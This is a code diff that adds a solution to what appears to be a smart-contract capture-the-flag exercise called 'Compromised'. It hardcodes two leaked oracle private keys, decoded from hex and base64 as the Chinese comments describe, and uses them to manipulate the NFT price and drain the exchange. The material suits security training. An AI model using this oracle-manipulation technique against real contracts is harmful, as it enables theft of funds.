@@ -61,6 +61,32 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+    //1.先把那串16进制转文本：https://www.bejson.com/convert/ox2str/
+    //2.得到base64文本,再进行base64解密得到私钥:https://base64.us/
+
+    let s1Signer = new ethers.Wallet(
+        "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+        ethers.provider
+      );
+      let s2Signer = new ethers.Wallet(
+        "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
+        ethers.provider
+      );
+  
+      await this.oracle.connect(s1Signer).postPrice("DVNFT", 0);
+      await this.oracle.connect(s2Signer).postPrice("DVNFT", 0);
+      await this.exchange.connect(attacker).buyOne({ value: 1 });
+      await this.oracle
+        .connect(s1Signer)
+        .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+      await this.oracle
+        .connect(s2Signer)
+        .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+      await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+      await this.exchange.connect(attacker).sellOne(0);
+  
+      await this.oracle.connect(s1Signer).postPrice("DVNFT", INITIAL_NFT_PRICE);
+      await this.oracle.connect(s2Signer).postPrice("DVNFT", INITIAL_NFT_PRICE);        
     });
 
     after(async function () {
